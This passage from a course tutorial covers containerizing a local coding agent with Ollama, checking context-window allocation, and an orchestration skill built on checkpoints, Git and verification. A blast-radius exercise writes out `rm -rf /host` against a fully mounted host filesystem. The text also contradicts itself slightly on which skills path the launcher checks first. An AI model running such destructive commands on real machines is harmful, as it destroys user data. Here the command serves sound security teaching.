That last one is the one students skip past, and it is the most valuable of the three.  `npm` packages may declare `postinstall` scripts, which are arbitrary code that runs at install time; the [AI coding agent security]({{ site.baseurl }}/Tutorials/CodingAgentSecurity) tutorial treats that as a supply-chain attack surface.  `--ignore-scripts` closes it.

### The context window, and why the launcher refuses to start

This is the part of the script that will stop you on your first run, and the failure is deliberate.

Inside the container, a Python launcher asks your Ollama server what it is actually doing before it tells the agent anything.  It asks four questions in order, and each one is a fallback for the last:

```python
tags = request_json(base, "/api/tags", timeout=timeout)      # 1. is the model installed?
show = request_json(base, "/api/show", {"model": model}, timeout)  # 2. what is its stated maximum?
request_json(base, "/v1/chat/completions", probe, timeout)   # 3. load it, using the same endpoint pi will
active = active_context(request_json(base, "/api/ps", ...))  # 4. what did the server ACTUALLY allocate?
```

Step 4 is the one that matters, and step 3 exists to make step 4 meaningful: a model that is not loaded has no allocation to report, so the launcher sends one trivial completion first to force the load.  Note the comment in the script that the probe deliberately does not set `num_ctx`, because a probe that configured the window would measure a runner other than the one the agent later uses.

The reason for all this care is that a model's advertised maximum and a server's actual allocation are different numbers, and the agent behaves badly when it believes the larger one.  An agent told it has 128K tokens when the server gave it 4096 does not fail cleanly.  It fills the window, the server silently drops the oldest tokens, and the agent continues confidently with the beginning of its own instructions missing.

Once it knows the real number, the launcher does arithmetic, and refuses if the arithmetic does not work out:

```python
def token_budgets(context, config):
    output = min(config["maxOutputTokens"], context // 4)
    reserve = min(context // 2, max(output + 2048, (context * 3) // 8))
    recent = min(config["keepRecentTokens"], context // 8)
    if context < 8192 or output < 1024:
        raise ValueError(f"Detected {context} tokens: too small for this skill. "
                         "Configure a larger context on the Ollama server, then restart.")
    return output, reserve, recent
```

Read that as three reservations out of one budget.  At most a quarter of the window is allowed for the reply, because a model that is permitted to write until the window is full leaves no room for the conversation that produced it.  `reserve` is the trigger point for compaction, set so that compaction begins while there is still room to compact, rather than after the overflow it was meant to prevent.  And `recent` is what survives compaction verbatim, capped at an eighth of the window.

> On a stock install this raises, and the message is `Detected 4096 tokens: too small for this skill`.  Ollama's default context length is 4096 tokens on any machine with less than 24 GiB of VRAM, which is every laptop in this room.  The fix is to start the server with a bigger window, alongside the `OLLAMA_HOST` setting Section 3 already required:
>
> ```bash
> OLLAMA_CONTEXT_LENGTH=8192 OLLAMA_HOST=0.0.0.0 ollama serve
> ```
>
> ```powershell
> $env:OLLAMA_CONTEXT_LENGTH = "8192"
> $env:OLLAMA_HOST = "0.0.0.0"
> ollama serve
> ```
>
> One caveat that will cost you an hour if you miss it: a `num_ctx` baked into a model's Modelfile takes precedence over this environment variable.  If you set the variable and the launcher still reports 4096, check the model rather than the server.
{: .tb-practice data-title="Checkpoint"}

`PI_FALLBACK_CONTEXT` is what the launcher assumes when step 4 returns nothing at all.  Its name suggests a safety net, and the script is careful to say it is not one:

```python
if not active:
    print(f"[bootstrap] WARNING: using {context}-token fallback. This is not a verified "
          "allocation; lower PI_FALLBACK_CONTEXT if your server allocates less.", flush=True)
```

An operator assumption is not a measurement.  If you see that warning, the number the agent is working with is one you supplied, not one anyone checked.

### One more thing the launcher insists on

The script will also refuse to start if the orchestration skill is not in your project:

```python
skill = next((root / path for path in (
    ".agents/skills/small-model-orchestrator",
    ".pi/skills/small-model-orchestrator") if (root / path / "SKILL.md").is_file()), None)
if skill is None:
    raise ValueError("small-model-orchestrator/SKILL.md was not found under .agents/skills or .pi/skills")
```

Two locations are checked in order and the first `SKILL.md` found wins.  Use the first, `.agents/skills/`, because it is also one of the directories opencode reads.  One skills directory then serves both tools, and you never have to remember which project uses which convention.

A `.skill` file is a zip archive with the skill's directory at its top level, so **extracting it into `.agents/skills/` produces exactly the path the launcher checks last**, which is the one to use.  Run this from the root of the project you want the agent to work on, before your first launch:

```bash
mkdir -p .agents/skills
curl -fsSL -o smo.skill https://raw.githubusercontent.com/BillJr99/Ursinus-CS357-Fall2026/gh-pages/files/small-model-orchestrator.skill
unzip -q smo.skill -d .agents/skills/ && rm smo.skill
ls .agents/skills/small-model-orchestrator/SKILL.md
```

```powershell
New-Item -ItemType Directory -Force -Path .agents\skills | Out-Null
curl.exe -fsSL -o smo.zip https://raw.githubusercontent.com/BillJr99/Ursinus-CS357-Fall2026/gh-pages/files/small-model-orchestrator.skill
Expand-Archive -Path smo.zip -DestinationPath .agents\skills -Force; Remove-Item smo.zip
Get-Item .agents\skills\small-model-orchestrator\SKILL.md
```

The PowerShell version downloads under a `.zip` name because `Expand-Archive` insists on that extension.  The bytes are identical either way.

> **Set this up in an earlier session, into a folder named `.skills`?**  Move it with `mv .skills/small-model-orchestrator .agents/skills/`.  The launcher used to check `.skills/` as well and no longer does, so it will refuse to start until the directory moves.  Nothing inside the skill changes; only where it sits.
{: .tb-warning data-title="Watch out"}

> Check the shape of what you extracted, not merely that something arrived.  `SKILL.md` has to sit at `.agents/skills/small-model-orchestrator/SKILL.md`.  Some unzip tools helpfully create a folder named after the archive, leaving you with `.agents/skills/small-model-orchestrator/small-model-orchestrator/SKILL.md`, which the launcher will not find.  The `ls` and `Get-Item` lines above exist to catch that in one second rather than in ten minutes.
{: .tb-warning data-title="Watch out"}

That skill is the subject of the next section.

### Surviving the interruption

The script installs a small extension that watches for the two ways a session ends badly and writes a record of each to disk:

```javascript
pi.on("turn_end", async (event, ctx) => {
  if (["length", "error", "aborted"].includes(event.message?.stopReason)) {
    record(ctx, "interrupted-turn", { stopReason: event.message.stopReason, ... });
    ctx.ui.notify("Interrupted turn recorded. Check disk state before retrying.", "warning");
  }
});

pi.on("session_compact_failed", async (event, ctx) => {
  record(ctx, "compaction-failed", { reason: event.reason, ... });
});
```

A `stopReason` of `length` means the model was cut off mid-sentence, and the notification says to check disk state *before retrying* rather than simply retrying.  That instruction is the whole idea: a tool call that was cut off may still have run, and the response you did not receive is not evidence that nothing happened.

Sessions live under `<project>/.pi/` and the task checkpoint lives under `<project>/.small-model-orchestrator/`.  Both are in your project, not in the container, which is what makes the container disposable.  Three flags bring you back:

| Command | What it does |
|---|---|
| `bash run-pi-ollama.sh --continue` | Reopen the last session |
| `bash run-pi-ollama.sh --resume` | Choose from saved sessions |
| `bash run-pi-ollama.sh --recover` | Start a *fresh* session from the durable checkpoint |
| `/smo-recover` | The same fresh-session recovery, from inside the agent |

`--recover` is the interesting one.  It does not reload the old conversation.  It reads the checkpoint file and starts clean, which is the correct move when the reason the session ended was that its context was the problem.

### The rootless alternative

Everything above is the cost of having no build step.  If you would rather pay the build once and never run as root, [Dockerfile]({{ site.baseurl }}/files/pi-ollama/Dockerfile) does the same work in the other order: the `apt-get` and `npm install` happen at build time, and the image it produces has no privileged phase at all.  It needs two files beside it, [launcher.py]({{ site.baseurl }}/files/pi-ollama/launcher.py) and [recovery.mjs]({{ site.baseurl }}/files/pi-ollama/recovery.mjs), which are the same code the script writes out at run time.

Build it once.  This command is identical on every platform:

```bash
docker build -t course-pi-ollama .
```

Then run it from whatever project you want the agent to work on:

```bash
docker run --rm -it \
  --user "$(id -u):$(id -g)" \
  --add-host=host.docker.internal:host-gateway \
  --security-opt=no-new-privileges --cap-drop ALL --pids-limit=1024 \
  -v "$PWD:/workspace" -w /workspace \
  -e PI_OLLAMA_MODEL=llama3.2 \
  course-pi-ollama
```

```powershell
docker run --rm -it `
  --add-host=host.docker.internal:host-gateway `
  --security-opt=no-new-privileges --cap-drop ALL --pids-limit=1024 `
  -v "${PWD}:/workspace" -w /workspace `
  -e PI_OLLAMA_MODEL=llama3.2 `
  course-pi-ollama
```

Three differences between those two commands, all of them real, and all of them worth knowing before you spend an afternoon on one:

1.  **Line continuation** is a backslash in bash and a backtick in PowerShell.
2.  **`$PWD` needs braces in PowerShell**, written `${PWD}`, because otherwise the colon that follows is read as part of the variable name and the mount silently goes to the wrong place.
3.  **`--user` appears only in the bash version.**  On Linux and macOS a container writing into a bind mount writes with the container's own UID, so passing your own UID and GID is what makes the resulting files yours.  Docker Desktop on Windows translates ownership at the mount boundary instead, so there is no UID to pass and the flag has nothing to do.

Note what the rootless version can add that the script cannot: `--cap-drop ALL`.  The script cannot drop capabilities at launch, because it needs them for the `apt-get` it is about to run.  An image that did its installing at build time has nothing left to keep them for.

> this is the same argument the course container makes, and it is worth noticing that all three of this course's container patterns land in the same place.  The devcontainer ends with `USER student`.  The `course-pi` image in Section 4 above ends with `USER agent`.  This image ends with `USER agent` as well.  A container that runs as root is the exception in this course, and the exception exists here so you can see the reason for the rule.
{: .tb-key data-title="Why this matters"}

The [quickstart README]({{ site.baseurl }}/files/pi-ollama/README.md) collects every command on this page in one place, with a troubleshooting table.

### Questions to Work Through

13.  The script runs `apt-get` and `npm install` on every launch, as root, and the prebuilt image runs them once at build time.  Both end up executing the same third-party package code with full privileges at some point.  Explain what the image route actually buys, given that, and name the specific property of build time that makes running as root there less dangerous than running as root at launch.

   *Hint: Ask when each one happens, how often, and what is mounted at the time.  A build has no bind mount to your project and produces an artifact you can inspect with `docker history` before you ever run it.*

14.  You set `OLLAMA_CONTEXT_LENGTH=8192` and restarted Ollama, but the launcher still reports `Detected 4096 tokens`.  Name the most likely cause, give the command that would confirm it, and say why the environment variable loses.

   *Hint: The launcher reads `num_ctx` out of `/api/show` as well as the live allocation.  A parameter baked into a model takes precedence over a server default, and `ollama show --modelfile <model>` will tell you whether yours has one.*

15.  A teammate proposes deleting `--ignore-scripts` from the `npm install` line, because a package they want fails to install without its `postinstall` hook.  The script runs that install as root with your project bind-mounted at `/workspace`.  Describe the worst realistic outcome of that change, then propose a way to get the package working that does not involve running its hooks as root over your project.

   *Hint: A `postinstall` hook is arbitrary code running with whatever privileges the install has, and at that moment the install can see and write everything under `/workspace`.  Consider where else that install could happen: a build stage, with no bind mount, whose output you inspect before running.*

---

## A Skill That Scaffolds a Small Model

The previous section put a small model inside a box and handed it your project.  This section is about the other half of that arrangement, which is the harder half: a 3B model asked to do twenty minutes of careful work will lose the thread, and no amount of containerization fixes that.  The skill below is one answer to it.  Download it, read it, and install it into your project:

- [small-model-orchestrator.skill]({{ site.baseurl }}/files/small-model-orchestrator.skill), the installable archive

The course site hosts the archive rather than its unpacked contents, so reading it is a download rather than a click.  A `.skill` file is an ordinary zip, which means you can look inside before you commit to anything:

```bash
curl -fsSL -O https://www.billmongan.com/Ursinus-CS357-Fall2026/files/small-model-orchestrator.skill
unzip -l small-model-orchestrator.skill          # list the contents without extracting
unzip -p small-model-orchestrator.skill small-model-orchestrator/SKILL.md | head -40
```

That last line is worth running before anything else, because the first fifteen lines are the whole of what a model sees when deciding whether this skill applies to the task in front of it:

```yaml
---
name: small-model-orchestrator
description: Reliability and orchestration protocol for difficult coding, tool-use,
  research, data, document, and mixed tasks, especially with small local or offline
  language models. Use when correctness matters more than latency or token cost and
  the agent should plan progressively, keep an always-current RESUME.md handoff
  checkpoint, version its work with Git, compact context proactively, verify every
  consequential action, diagnose failures, retry and replan, and perform adversarial
  gauntlet review before declaring success.
license: MIT
metadata:
  author: Bill + OpenAI
  version: "0.4.0-platform-agnostic"
  primary-use-case: "local-offline-private-models"
  optimization-target: "maximum-verified-task-success"
---
```

Read the `description` as a set of trigger conditions rather than as a summary.  It names task types (coding, tool use, research, data, documents), then a condition under which the skill should fire at all, *when correctness matters more than latency or token cost*, then the specific behaviors it will impose.  A model matching this against "fix the typo in line 4" should decline; a model matching it against "migrate this schema and verify nothing broke" should load it.  **That judgment is made entirely from this block**, which is why the Skill Design Study spends as much time on the description as on the body.

> Reading a downloaded skill before you install it is not optional diligence.  A skill is instruction-based control over an agent that will run commands on your machine, and the agent follows a bad instruction as faithfully as a good one.  `unzip -l` first, read `SKILL.md` second, install third.
{: .tb-warning data-title="Watch out"}

### The problem it is built for

Three failures show up constantly when you drive a small local model through a long task, and they are easy to confuse with each other:

| What you see | What actually happened | Why it is not obvious |
|---|---|---|
| The agent forgets a constraint you set twenty turns ago | The context window filled and the oldest tokens were dropped | The model does not announce the loss.  It continues fluently without them |
| The agent stops mid-sentence, or mid-JSON | The output token limit was reached | A truncated tool call looks like a malformed one |
| The agent says it finished, and it did not | Nothing checked the claim | A confident summary reads exactly like a correct one |
{: .tb-full}

The third is the dangerous one, and the skill's framing of it is the sentence worth taking away from this whole tutorial:

> A fluent response, successful command, or generated file is not proof of completion.

Notice that none of the three is a knowledge problem.  A bigger model has the same three failure modes and simply reaches them later.  What the skill does is refuse to let the conversation be the only place the work is recorded.

Version 0.4.0 adds a fourth failure, and it is worth quoting the skill's own description of it because it is a field report rather than a hypothetical:

> These changes respond to an observed failure pattern: with frequent compaction, a small model trusted drifting summaries over disk, stopped updating its checkpoint, edited from memory, and lost work to an unversioned delete.

Read that as a chain rather than as one mistake, because each link enables the next.  The summary drifted from what was actually on disk.  Trusting the summary, the model stopped seeing a reason to write the checkpoint.  With no checkpoint, it edited from its recollection of a file instead of from the file.  And with nothing versioned, a delete had no undo.  **Four small omissions, and only the last one is visible when it goes wrong.**

### The three invariants

The whole protocol compresses to three sentences, and each one closes a link in that chain:

| Invariant | What it means | Which failure it prevents |
|---|---|---|
| **Handoff-ready at all times** | `RESUME.md` must let a fresh agent with no transcript continue correctly if this session ended right now | The checkpoint going stale |
| **Every verified step is a Git checkpoint** | Work can be inspected with `git log` and `git status`, and rolled back to the last good state | The unversioned delete |
| **Disk beats memory** | After any compaction, summary, restart, or surprise, trust `RESUME.md`, Git, and fresh reads over recalled file contents | The drifting summary, and editing from memory |
{: .tb-full}

The middle one is the biggest change from the previous version, where Git was optional. It is now the primary recovery mechanism, and the skill is specific about the permissions that come with it.

### Git as the undo button, with the safety rules that make that safe

Handing an unsupervised agent a version control system is not obviously a good idea, so notice how narrowly the skill scopes it.  Local commits on a dedicated task branch are expected; **everything that could affect anyone else requires explicit permission**:

> Never push, merge, rebase, force-update, delete branches, or rewrite history without explicit user permission.
>
> Never commit to the user's current branch without permission; use a task branch.

Setup is six steps, and two of them exist purely to protect work the agent did not write.  If the project has pre-existing uncommitted changes, the skill saves a patch snapshot and **asks before proceeding**, because sweeping unexplained changes into a task commit would silently take ownership of somebody else's work in progress.  And the task state directory goes into `.git/info/exclude` rather than into a commit, for a reason worth pausing on: if `.small-model-orchestrator/` were versioned alongside the code, then checking out an older commit would roll `RESUME.md` back to a stale checkpoint, and the recovery mechanism would restore a wrong description of its own progress.  **The map must not be versioned with the territory.**

Commits carry a fixed message form, `task:<id> <milestone/action> <VERIFIED|WIP>: <short summary>`, and the distinction in that field is load-bearing.  Work that is written but not yet verified may be committed as `WIP` when it would be expensive to recreate, and the rule is that it is **never cited as verified afterward**.  That is the same separation between confidence and evidence that runs through the rest of the skill, applied to the commit log.

### Never edit from memory

One rule in version 0.4.0 is short enough to adopt today, whatever you are working with:

> Re-read the exact lines immediately before editing.  Never build a replacement's old text from memory, a summary, or an earlier read taken before other edits.

The failure it prevents is specific.  An agent reads a file, makes three edits, then constructs a fourth edit using text it remembers from the first read, which the earlier edits have already changed.  The match fails, or worse, matches in a place it should not.  The skill's escalation is worth copying too: retry once with a smaller, unique anchor, and after a second failure on the same file, stop guessing.  Re-read the whole file and rewrite it, or re-anchor from `RESUME.md` and `git status`.

There is a matching rule for *after* an edit, which is the same verification discipline in miniature: re-read the changed region, then run the syntax check, import, or test that covers it.  A successful edit tool call is a claim, not evidence.

### Durable state: the repository remembers, the conversation does not

The skill keeps a directory in your project, `.small-model-orchestrator/`, and the single most important file in it is `RESUME.md`.  Every checkpoint records the same six things:

1.  Task identity and objective.
2.  Constraints and permission boundaries.
3.  Verified progress, and unresolved issues.
4.  Where the evidence lives.
5.  The exact next action, and the verifier that will confirm it.
6.  Any operation currently in flight, and its uncertain completion state.

If that list feels familiar, it should.  It is the same argument the [agent governance]({{ site.baseurl }}/Tutorials/AgentGovernance) tutorial makes with `.ai/CURRENT_TASK.md` and `.ai/SESSION.md`, arriving from a different direction.  There, durable state exists so a *different* agent can pick the work up.  Here it exists so *the same* agent can survive its own context running out.  Both end at the same rule: the repository is the durable memory, and the conversation is not.

Item 6 is the one that distinguishes this skill from ordinary note-taking.  Before any consequential action, the checkpoint is written with the outcome recorded as `UNKNOWN`, and it stays `UNKNOWN` until something independent checks it:

> a lost response is not evidence that nothing happened.  If the connection drops during a file write, a database update, or an API call, the operation may well have completed on the other side.  An agent that assumes failure and retries has just done it twice.  The skill's rule is that an interrupted mutation is `UNKNOWN` until checked, never "failed", and this is the single most useful habit in the whole protocol.
{: .tb-key data-title="Why this matters"}

Version 0.4.0 also replaced "keep it current" with a list of specific moments, because a general reminder is exactly the instruction a small model quietly stops following.  Write the checkpoint before any mutation whose outcome would be unclear if interrupted; after each verified action or commit; after any failure, surprise, or change of plan; whenever you learn something a successor would need, such as an interface or a path or a gotcha; before context may be compacted; and at least every few tool calls during a long investigation.  **The instruction "do not batch these for later" is doing real work,** because batching is how the checkpoint goes stale without anyone deciding that it should.

Every action ends up in one of five states, and the vocabulary is deliberately more precise than pass and fail:

| Status | Meaning |
|---|---|
| `VERIFIED` | The postcondition was checked and holds |
| `FAILED` | It was checked and does not hold |
| `BLOCKED` | Something external prevents progress |
| `INVALIDATED` | An earlier result is no longer true |
| `NEEDS_REVIEW` | A human has to look at this |

### Writing a checkpoint without destroying the last good one

`scripts/checkpoint.py` reads a JSON object on standard input, validates it against a schema, and only then replaces `RESUME.md`.  Two design choices in it are worth studying, because they are the general pattern for any agent that writes files:

The write is **atomic**.  The new content goes to a temporary file, is flushed, and only then replaces the target, with the containing directory flushed too on POSIX systems.  A crash halfway through leaves you with the old checkpoint intact rather than half of a new one.

Invalid input **changes nothing**.  If the JSON is malformed, incomplete, or over the size limit, the previous checkpoint survives untouched.  This matters more than it sounds: the moment a model is most likely to emit truncated JSON is exactly when its context is exhausted, which is exactly when you most need the last good checkpoint.

The size limit is 8000 bytes, set in `assets/checkpoint-config.json`.  That is a byte count and not a token count, and it is small on purpose, because a checkpoint that does not fit in a fresh session's context has failed at its only job.  Detail goes to the evidence files; the checkpoint holds pointers to them.

### What counts as evidence

The skill ranks evidence rather than treating it as a yes-or-no property, and the ordering is the part to memorize:

| Strength | Kind of evidence |
|---|---|
| Strongest | Direct observation of the external state you asked for |
| | An existing, authoritative test suite |
| | An independent oracle or external specification |
| | A targeted reproducer for the original failure |
| | An independent critic inspecting the work |
| | Tests the agent wrote itself |
| | Static inspection |
| Weakest | The model asserting that it worked |

The principle underneath is independence: evidence is strong when it fails differently from the thing it is testing.  An implementation and a test written from the same misreading of the requirement are correlated, and they will agree with each other while both being wrong.  This is why "the tool returned success" ranks below reading the changed state back, and why it is worth the extra call to do so.

### The gauntlet: trying to prove it is not done

Before declaring success on anything consequential, the skill runs an adversarial review pass, and it is specific about what that means:

> The gauntlet is not a request for generic criticism.  It is an attempt to falsify completion.

Nine attack surfaces are required, and an agent that finds nothing on all nine has almost certainly not looked: requirements omissions, functional correctness, edge cases and adversarial inputs, tool misuse and unverified side effects, regression risk, security assumptions, **fake completeness**, unnecessary complexity, and evidence quality.

The seventh is the one worth reading closely, because it is the list of ways work gets reported as finished when it is not: TODO and FIXME comments, stubs, placeholders, mocked behavior sitting in a production path, skipped or disabled tests, swallowed errors, migrations that never ran, fabricated results, and comments describing behavior the code does not have.

Each finding carries an ID, a severity, its attack surface, the claim, the evidence, a reproduction, the required repair, and its resolution status.  Blocking findings send the work back to execution, and the relevant gauntlet sections run again afterward.  That structure is the *Karpathy Loop and the Gauntlet Loop* activity's seven-step procedure, written as something an agent follows rather than something you run by hand, so the two are worth reading side by side.

### Recovery that depends on the failure

The one table to keep open while you work:

| What you observe | What to do |
|---|---|
| Input overflow, or the server truncated your input | Reconcile the context limits, try compaction once, then start a fresh session from the checkpoint if it fails or recurs without progress |
| Output limit hit, or an incomplete tool-call payload | Inspect what actually executed and which files changed, then split the action and re-run its verifier |
| Tool output truncated or paginated | Narrow the query, or read specific ranges from the saved complete output |
| Connection lost, timeout, or a crash | Treat the in-flight effect as `UNKNOWN` and verify before any replay |
| Compaction failed or came back incomplete | Keep the checkpoint and the old session records, and rebuild working context from the checkpoint |

Two prohibitions run through all of it.  Never concatenate partial JSON, commands, or code into something you then treat as complete.  And never retry an unchanged failing payload: change the hypothesis, the inputs, the tactic, or the decomposition first, or you are just paying for the same failure twice.

Version 0.4.0 treats compaction as something to schedule rather than something to survive.  Compact at a natural boundary, just after a commit and a checkpoint update, when a subtask ends: **compacting then costs almost nothing, because the state is already on disk.**  Compact early, at roughly half to two-thirds of the window, rather than at overflow.  And afterward, re-anchor before doing anything else: read `RESUME.md`, run `git status` and `git log --oneline -5`, inspect `git status` for in-flight changes, and re-read any file before editing it.  Where the summary and the disk disagree, **the disk wins, and the discrepancy gets recorded.**

> compaction is not a substitute for the checkpoint.  A compaction summary is generated by the same model whose context is already in trouble, and it optimizes for continuing the conversation.  The checkpoint was written deliberately, while things were going well, and validated against a schema.  The skill's rule is not to wait for overflow before saving state, and not to ask an already-overflowing context to produce a comprehensive rescue summary.
{: .tb-pitfall data-title="Common Misconception"}

### Which model to point at it

Start with `llama3.2`, the model you pulled for the Overview assignment.  Expect it to strain, and expect that to be informative rather than discouraging: this course has said in several places that a smaller model follows a numbered list less reliably, and this is where you get to watch that happen against a protocol demanding enough to make it visible.  Where it drops a step, ask whether the skill could have made that step harder to drop.  That question is the Skill Design Study in miniature.

If you want to compare, these are already in use elsewhere in the course, so none of them is a new download decision:

| Model | Pull | Roughly | When to reach for it |
|---|---|---|---|
| `llama3.2` | already pulled | 2 GB | The default.  Start here, and learn what the ceiling feels like |
| `llama3.2:1b` | `ollama pull llama3.2:1b` | 1.3 GB | Deliberately too small.  Useful for *seeing* a failure mode clearly |
| `qwen2.5:7b` | `ollama pull qwen2.5:7b` | 4.7 GB | 16 GB machines.  Noticeably steadier at following a long protocol |
| `hermes3:8b` | `ollama pull hermes3:8b` | 4.7 GB | When structured output and tool calls are what keep breaking |
| `qwen3.8:27b` | `ollama pull qwen3.8:27b` | 18 GB | Only with 24 GB or more.  A reasoning model built for long-horizon agentic work, and the one this launcher's defaults were written for |
{: .tb-full}

Remember what you learned in the previous section: the model's advertised maximum is not your server's allocation.  A 128K-context model served in a 4096-token window is a 4096-token model, and pulling something larger does nothing about that.

One setting only becomes meaningful at the bottom of that table, and it explains two defaults that look inert on `llama3.2`.  The launcher ships with `PI_REASONING=auto` and `PI_THINKING_LEVEL=medium`, and `auto` means it asks Ollama whether the model advertises a `thinking` capability and turns reasoning off when it does not:

```python
capabilities = show.get("capabilities")
reasoning = config["reasoning"] == "on" or (
    config["reasoning"] == "auto" and "thinking" in (capabilities or []))
thinking = config["thinkingLevel"] if reasoning else "off"
```

On `llama3.2` that resolves to off, and the launcher says so at startup.  On a reasoning model such as `qwen3.8:27b`, whose thinking mode is on by default and whose depth is tunable through `reasoning_effort`, the same two settings suddenly do something, and `PI_THINKING_LEVEL` becomes a dial worth turning.  The warning in that branch is worth heeding in the other direction too: **do not force `PI_REASONING=on` for a model you have not confirmed supports it**, because you will be sending a parameter the server may reject or quietly ignore.

### More than one model, and when it actually helps

The skill's default is to assume one model, and it says so plainly: do not go looking for a second model merely because the first one is performing badly.  That default exists because switching models is the most tempting and least diagnostic response to a bad result.  If the first model failed because your instructions were ambiguous, the second one fails too, and you have learned nothing while doubling the runtime.

But the skill also says that if you know several models are available, you may use them freely, and it names where they help.  Every one of those places has the same shape: a second model is useful when you want a **failure that is uncorrelated with the first model's**, which is the independence principle from the evidence hierarchy applied to the models themselves.

| Use | Why a second model helps |
|---|---|
| Independent planning | Two plans that differ tell you the task is underspecified, which is worth knowing before you build |
| Alternative implementations | Divergence localizes the ambiguity to a specific decision |
| Test generation | A test written by the model that wrote the code inherits its misreading.  A different model does not share it |
| Cold criticism | A critic with none of the builder's reasoning cannot be persuaded by it |
| Gauntlet review | The nine attack surfaces are more productive when the reviewer has no stake in the artifact |
| Tie-breaking | A third opinion, when two disagree and both are defensible |

This is the same machinery as *Critique, Consensus, and the LLM Judge*, with one practical difference: there you ran the pattern by hand to understand it, and here a skill invokes it as part of a longer task.  The warning from that session carries over unchanged.  Two models that agree are not thereby correct, especially when they share training data, and correlated agreement is the failure mode that looks most like success.

> The cheapest useful version of this needs no second machine and no second download: run the gauntlet pass in a *fresh session* with the same model, giving it the contract, the artifact, and the evidence, and withholding the builder's reasoning.  Much of the value is in the isolation rather than in the second model.  The skill asks you to disclose when a review was a self-review, which is a discipline worth copying into work of your own.
{: .tb-practice data-title="Checkpoint"}

### Reading the skill as a skill

Set the protocol aside for a moment and look at the file as an artifact for the Skill Design Study, because it is a useful counterexample to the two small skills built in the Skills session.  Those are a page each.  This one is sixteen reference files, ten templates, and six scripts, and the design question it answers is one the small skills never have to face: what do you do when the guidance is far larger than the context you have to spend on it?

Its answer is routing.  `SKILL.md` stays compact and loads exactly one reference for the current phase, and the instruction is explicit that the agent must not load all of the verification, failure, refinement, and critic references at bootstrap.  Guidance that does not fit is guidance that does not get followed, so the skill treats its own size as a budget to manage.

Two more things to notice, both of which are testable claims you can check against your own runs:

- **The description is the trigger.**  Its `description` field names the situation rather than the skill, listing coding, tool use, research, data, documents, and mixed tasks, and naming the condition "when correctness matters more than latency or token cost".  A model decides whether to load a skill from that sentence alone.
- **It states its own limits.**  The README says a skill cannot restart a dead process, cannot enforce model compliance, and cannot establish the outcome of an external mutation whose response was lost.  A skill that claims less is easier to trust about what it does claim.

### Questions to Work Through

16.  The skill writes a checkpoint marked `UNKNOWN` *before* a mutation rather than recording the result *after* it.  Construct a specific scenario where recording only after the fact causes real damage, and say what the `UNKNOWN` checkpoint lets the next session do that it otherwise could not.

   *Hint: Consider an operation that succeeds on the server while the response is lost in transit.  Ask what a fresh session with no record at all would conclude, and what it would do next.*

17.  A teammate reports that their agent produced a passing test suite for code that is plainly wrong.  Using the evidence hierarchy, explain how both things can be true at once, then name the two kinds of evidence from the table that would have caught it.

   *Hint: The agent wrote both the code and the tests, from one reading of the requirement.  Look for the rows whose failure mode is independent of the implementation.*

18.  You are running `llama3.2` and it repeatedly skips the verification step after a mutation.  The skill says not to switch models merely because performance is weak.  Give two changes you would make first, say what evidence would tell you each one worked, and state the one observation that would justify reaching for a larger model after all.

   *Hint: The two obvious candidates are making the step structurally impossible to skip rather than merely instructed, and shortening what the model must hold at once.  For the last part, ask what a failure that is about capacity rather than instruction design would look like.*

---

## Exercises

Everything below is optional.  Nothing here is collected and nothing here is graded; this is a tutorial, and the exercises exist so that you can lay out the mounts and permissions yourself rather than only read about them.  Each one ends with a check you apply yourself, so you can tell whether it worked.

1.  **Build a safe agent workspace.**

   *What to do:* Write the complete sequence of `mkdir`, `chmod`, and `docker run` commands to set up a safe workspace for a three-agent pipeline (ResearchAgent, WriterAgent, CriticAgent).  Each agent should have its own identity directory.  Data flow: ResearchAgent writes to its own workspace; WriterAgent reads ResearchAgent's workspace (read-only) and writes to its own; CriticAgent reads WriterAgent's workspace (read-only) and writes its verdict to a shared `/output` directory.  No agent should be able to read another agent's `config/` or `logs/` directory.

   *Starter hint:* Start by drawing the directory tree on paper before writing any commands:
   ```
   /home/user/agents/
     researcher/{config,memory,logs,workspace}/
     writer/{config,memory,logs,workspace}/
     critic/{config,memory,logs,workspace}/
   /home/user/shared/
     output/
   ```
   Then for each `docker run` command, list the `-v` flags you need: one for the agent's own identity dir (`:rw`), one for its input (`:ro`), and one for its output (`:rw`).

   *You've succeeded when* you can explain which `-v` flag in each `docker run` command enforces each part of the "no agent reads another's config or logs" requirement.

2.  **Blast radius calculation.**

   *What to do:* For each of the following agent configurations, calculate and justify the blast radius: the maximum damage a single bad command could cause.  Rank the three configurations from safest to most dangerous.

   - (a) Agent runs as root inside a container with `docker run -v /:/host` (the entire host filesystem mounted).
   - (b) Agent runs as non-root user `agentuser` with write access only to `/workspace/output`.
   - (c) Agent runs in Docker with the `--read-only` flag and a single tmpfs (RAM disk) mount at `/tmp`.

   *Starter hint:* For each configuration, ask: "What is the most destructive single command this agent could run?"  For (a), consider `rm -rf /host`.  For (b), consider `rm -rf /workspace/output`.  For (c), consider whether writes outside `/tmp` are even possible.

   *You've succeeded when* you can explain in one sentence per configuration exactly what is protected and what is still at risk.

3.  **Filesystem as memory.**

   *What to do:* An agent writes its working notes to `memory/notes.md` and its completed task list to `memory/completed.json` inside its identity directory.  Compare this approach to keeping all state in the LLM's in-context memory (the conversation history).  List two advantages and two disadvantages of each approach.  Then answer: when would you prefer file-based memory, and when would you prefer in-context memory?

   *Starter hint:* Think about what happens when the agent's conversation runs too long and older context scrolls out.  File-based memory persists across sessions; in-context memory is lost when the conversation ends.  But file-based memory must be read back into context explicitly; it is not automatically available to the model.

   *You've succeeded when* you have a concrete scenario for each approach where one is clearly better than the other.

---

## Reflection Prompt

*Personal:* The principle of least privilege says every process should have exactly the access it needs and nothing more.  Think of a role you have held (a job, a club, a sports team) where you had more access, information, or authority than you needed to do your part.  Did that excess access create any risks you were aware of at the time?

*Technical:* Today we applied least privilege to Docker volume mounts.  Describe a specific scenario where a developer, in a hurry, would be tempted to use Student A's approach (mounting the full home directory) instead of Student B's approach.  What pressure leads to that shortcut, and what would a safe-by-default tooling design look like that makes the restrictive option easier than the permissive one?

*Societal:* Filesystem isolation limits what an AI agent can do on your personal machine.  But many agents operate on cloud infrastructure where "the filesystem" is a database or an object store shared by thousands of users.  What is the equivalent of "identity directories" in a multi-tenant cloud environment, and who is responsible for enforcing those boundaries: the cloud provider, the application developer, or the user?

> Consider what "tenant isolation" means in a shared database: each tenant's rows are stored in the same physical tables, but a row-level security policy ensures queries only return that tenant's data.  Is that the same guarantee as a Docker volume mount, or a weaker one?
{: .tb-tip data-title="Hint"}

---

## Where This Goes Next

